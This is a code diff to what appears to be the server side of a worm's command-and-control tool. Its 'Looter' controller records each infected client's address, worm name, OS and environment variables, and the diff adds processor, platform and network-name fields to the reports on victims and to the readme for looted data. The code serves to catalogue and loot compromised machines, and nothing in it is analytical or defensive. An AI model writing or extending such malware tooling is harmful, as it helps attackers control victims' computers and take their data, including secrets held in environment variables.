@@ -47,15 +47,15 @@ class BasicControler:
                 return
             response = ""
             for client in self.server.Central.clients.values():
-                 response += f"\nClient Info ID={client.ID}\nAddr: {client.Addr}\nName: {client.CliName}\nOs System: {client.Os}\nOther Info:\n{client.EnvVar}\n\n\n\n"
+                 response += f"\nClient Info ID={client.ID}\nAddr: {client.Addr}\nName: {client.CliName}\nOs System: {client.Os}\nProcesor: {client.procInfo}\nPlatform: {client.platformInfo}\nNetwork Name: {client.networkName}\nOther Info:\n{client.EnvVar}\n\n\n\n"
             self.server.Msg(response, onlyLog=True)
             return
         client = self.server.Central.clients.get(cliID)
         if not client:
             self.server.Msg(f"[!!] ERROR: Client ID={cliID} does not connected [!!]")
             return
-        response = f"\nClient Info ID={client.ID}\nAddr: {client.Addr}\nName: {client.CliName}\nOs System: {client.Os}\nOther Info:\n{client.EnvVar}"
-        self.Msg(response, onlyLog=True)
+        response = f"\nClient Info ID={client.ID}\nAddr: {client.Addr}\nName: {client.CliName}\nOs System: {client.Os}\nProcesor: {client.procInfo}\nPlatform: {client.platformInfo}\nNetwork Name: {client.networkName}\nOther Info:\n{client.EnvVar}\n\n\n\n"
+        self.server.Msg(response, onlyLog=True)
     
     def _servCMD(self, cmd : list) -> None:
         match cmd[1]:
@@ -292,10 +292,14 @@ class LooterControler(BasicControler):
     
     def prepareReadMe(self, tag: str, info: str, handler: object) -> str:
         cliInfo = f" ************ {tag} *********\n"
+        cliInfo += f"--------- {info} -----------\n"
         cliInfo += f"Address: {handler.Addr}\n"
         cliInfo += f"Worm Name: {handler.CliName}\n"
         cliInfo += f"Os System: {handler.Os}\n"
-        cliInfo += info + "\n\n\n"
+        cliInfo += f"Processor: {handler.procInfo}\n"
+        cliInfo += f"Platform: {handler.platformInfo}\n"
+        cliInfo += f"Network Name: {handler.networkName}\n"
+        cliInfo += "\n\n\n"
         cliInfo += handler.EnvVar
         return cliInfo
     
